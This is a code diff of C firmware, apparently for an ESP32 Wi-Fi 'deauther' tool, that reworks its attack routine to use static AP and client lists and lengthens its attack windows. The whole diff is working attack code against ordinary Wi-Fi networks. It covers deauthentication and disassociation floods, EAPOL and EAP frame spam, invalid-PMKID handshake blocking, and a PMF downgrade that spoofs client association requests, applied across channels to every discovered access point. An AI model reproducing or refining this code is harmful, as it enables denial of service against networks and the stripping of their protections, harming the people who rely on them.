@@ -13,9 +13,9 @@
 #define DEAUTHER_TASK_PRIO 5
 // Syncronization times
 #define CHANNEL_SWITCH_DELAY 12   // Channel switch assestment time
-#define ATTACK_WINDOW        50  // RCO duration
-#define SOFTAP_REST_TIME     150   // Home channel time
-#define SINGLE_TARGET_ROOM   50
+#define ATTACK_WINDOW        80  // RCO duration
+#define SOFTAP_REST_TIME     180   // Home channel time
+#define SINGLE_TARGET_ROOM   80
 
 static const char *TAG = "DEAUTHER";
 static TaskHandle_t deauther_task_handle = NULL;
@@ -26,6 +26,11 @@ static uint8_t random_mac[6];
 static const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 static const uint8_t reason_code = 0x07;
 static volatile bool deauther_running = false;
+
+/* AP info copy */
+static aps_info_t aps = {0};
+/* Clients list copy */
+static client_list_t clients = {0};
 
 
 /**
@@ -47,8 +52,7 @@ static uint8_t get_csa_switch_channel(uint8_t current_channel) {
  */
 static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssid, uint8_t ap_channel)
 {
-    clients_t *clients = malloc(sizeof(clients_t));
-    wifi_sniffer_get_clients(clients);
+    wifi_sniffer_get_clients(&clients);
     bool clients_targeted = false;
 
     switch (current_attack_type) 
@@ -56,10 +60,10 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
         // --- ATTACCHI IBRIDI (Client Specifici -> Fallback Broadcast) ---
         case DEAUTHER_ATTACK_DEAUTH_FRAME:
         {
-            if (clients != NULL && clients->count > 0) {
-                for (int c = 0; c < clients->count; c++) {
-                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
-                        wifi_attack_deauth_basic(clients->client[c].mac, ap_bssid, reason_code);
+            if (clients.count > 0) {
+                for (int c = 0; c < clients.count; c++) {
+                    if (memcmp(clients.client[c].bssid, ap_bssid, 6) == 0) {
+                        wifi_attack_deauth_basic(clients.client[c].mac, ap_bssid, reason_code);
                         clients_targeted = true;
                     }
                 }
@@ -72,10 +76,10 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
 
         case DEAUTHER_ATTACK_DISASSOC_FRAME:
         {
-            if (clients != NULL && clients->count > 0) {
-                for (int c = 0; c < clients->count; c++) {
-                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
-                        wifi_attack_send_disassoc(ap_bssid, clients->client[c].mac, reason_code);
+            if (clients.count > 0) {
+                for (int c = 0; c < clients.count; c++) {
+                    if (memcmp(clients.client[c].bssid, ap_bssid, 6) == 0) {
+                        wifi_attack_send_disassoc(ap_bssid, clients.client[c].mac, reason_code);
                         clients_targeted = true;
                     }
                 }
@@ -88,11 +92,11 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
 
         case DEAUTHER_ATTACK_BROADCAST_FLOOD:
         {
-            if (clients != NULL && clients->count > 0) {
-                for (int c = 0; c < clients->count; c++) {
-                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
-                        wifi_attack_deauth_basic(clients->client[c].mac, ap_bssid, reason_code);
-                        wifi_attack_send_disassoc(ap_bssid, clients->client[c].mac, reason_code);
+            if (clients.count > 0) {
+                for (int c = 0; c < clients.count; c++) {
+                    if (memcmp(clients.client[c].bssid, ap_bssid, 6) == 0) {
+                        wifi_attack_deauth_basic(clients.client[c].mac, ap_bssid, reason_code);
+                        wifi_attack_send_disassoc(ap_bssid, clients.client[c].mac, reason_code);
                         clients_targeted = true;
                     }
                 }
@@ -152,26 +156,26 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
         case DEAUTHER_ATTACK_EAP_ID_SPAM:
         case DEAUTHER_ATTACK_HANDSHAKE_BLOCK:
         {
-            if (clients != NULL && clients->count > 0) 
+            if (clients.count > 0) 
             {
-                for (uint8_t c = 0; c < clients->count; c++) 
+                for (uint8_t c = 0; c < clients.count; c++) 
                 {
-                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) 
+                    if (memcmp(clients.client[c].bssid, ap_bssid, 6) == 0) 
                     {
                         if (current_attack_type == DEAUTHER_ATTACK_EAPOL_LOGOFF)
-                            wifi_attack_deauth_ap_eapol_logoff(clients->client[c].mac, ap_bssid);
+                            wifi_attack_deauth_ap_eapol_logoff(clients.client[c].mac, ap_bssid);
                         
                         else if (current_attack_type == DEAUTHER_ATTACK_EAPOL_START)
-                            wifi_attack_deauth_ap_eapol_start(clients->client[c].mac, ap_bssid);
+                            wifi_attack_deauth_ap_eapol_start(clients.client[c].mac, ap_bssid);
                         
                         else if (current_attack_type == DEAUTHER_ATTACK_EAP_FAILURE)
-                            wifi_attack_deauth_client_eap_failure(clients->client[c].mac, ap_bssid);
+                            wifi_attack_deauth_client_eap_failure(clients.client[c].mac, ap_bssid);
                         
                         else if (current_attack_type == DEAUTHER_ATTACK_EAP_ID_SPAM)
-                            wifi_attack_deauth_client_eap_rounds(clients->client[c].mac, ap_bssid);
+                            wifi_attack_deauth_client_eap_rounds(clients.client[c].mac, ap_bssid);
                         
                         else if (current_attack_type == DEAUTHER_ATTACK_HANDSHAKE_BLOCK)
-                            wifi_attack_deauth_client_invalid_PMKID(clients->client[c].mac, ap_bssid);
+                            wifi_attack_deauth_client_invalid_PMKID(clients.client[c].mac, ap_bssid);
                     }
                 }
             }
@@ -180,13 +184,13 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
 
         case DEAUTHER_ATTACK_PMF_DOWNGRADE:
         {
-            if (clients != NULL && clients->count > 0) {
-                for (int c = 0; c < clients->count; c++) {
-                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
+            if (clients.count > 0) {
+                for (int c = 0; c < clients.count; c++) {
+                    if (memcmp(clients.client[c].bssid, ap_bssid, 6) == 0) {
                         // Inviamo Disassoc (per staccarlo) seguito da Assoc Req legacy
-                        wifi_attack_send_disassoc(ap_bssid, clients->client[c].mac, reason_code);
+                        wifi_attack_send_disassoc(ap_bssid, clients.client[c].mac, reason_code);
                         // Spoofiamo il client che chiede di connettersi senza PMF
-                        wifi_attack_send_assoc_req(ap_bssid, clients->client[c].mac);
+                        wifi_attack_send_assoc_req(ap_bssid, clients.client[c].mac);
                     }
                 }
             }
@@ -197,8 +201,6 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
             wifi_attack_deauth_basic(NULL, ap_bssid, reason_code);
             break;
     }
-
-    free(clients);
 }
 
 
@@ -214,21 +216,15 @@ static void deauther_send_frames(const target_info_t *target)
     // --- MODALITÀ BROADCAST (Smart Hopping) ---
     if (broadcast_target) 
     {
-        aps_info_t *aps = malloc(sizeof(aps_info_t));
-        if (aps == NULL) {
-            ESP_LOGE(TAG, "Failed to alloc aps, memory full!");
-            return;
-        }
-        wifi_sniffer_get_aps(aps);
-        if (aps == NULL || aps->count == 0) {
-            free(aps);
+        esp_err_t ret = wifi_sniffer_get_aps(&aps);
+        if (ret != ESP_OK || aps.count == 0) {
             return;
         }
         uint8_t target_channels[MAX_AP];
         uint8_t num_channels = 0;
-        for (int i = 0; i < aps->count; i++) 
+        for (int i = 0; i < aps.count; i++) 
         {
-            uint8_t ch = aps->ap[i].primary;
+            uint8_t ch = aps.ap[i].primary;
             bool exists = false;
             for (int k = 0; k < num_channels; k++) {
                 if (target_channels[k] == ch) {
@@ -246,13 +242,13 @@ static void deauther_send_frames(const target_info_t *target)
             wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
             vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
             int64_t start_time = esp_timer_get_time();
-            for (int i = 0; i < aps->count; i++) 
+            for (int i = 0; i < aps.count; i++) 
             {
-                if (aps->ap[i].primary == current_ch) 
+                if (aps.ap[i].primary == current_ch) 
                 {
                     // Burst di pacchetti
                     for(int k=0; k<7; k++) {
-                        execute_attack_on_target(aps->ap[i].bssid, (const char*)aps->ap[i].ssid, current_ch);
+                        execute_attack_on_target(aps.ap[i].bssid, (const char*)aps.ap[i].ssid, current_ch);
                         vTaskDelay(pdMS_TO_TICKS(10)); 
                     }
                 }
@@ -265,7 +261,6 @@ static void deauther_send_frames(const target_info_t *target)
             /* Wait some time to permit the AP to communicate on his own channel */
             vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
         }
-        free(aps);
     }
     // --- MODALITÀ SINGLE TARGET ---
     else 
@@ -297,12 +292,9 @@ static void deauther_task(void *pvParameters)
     /* Get target information */
     target_info_t *target = target_get(TARGET_INFO_DEAUTHER);
 
-    if(isMacBroadcast(target->bssid)) {
-        wifi_start_sniffing(NULL, SNIFF_MODE_GLOBAL_MONITOR);
-    }
-    else {
-        wifi_start_sniffing(target, SNIFF_MODE_TARGET_ONLY);
-    }
+    wifi_start_sniffing();
+    /* Ensure channel hopping is not running */
+    wifi_sniffer_stop_channel_hopping();
 
     /* First scan to fill APs list */
     wifi_sniffer_scan_fill_aps();
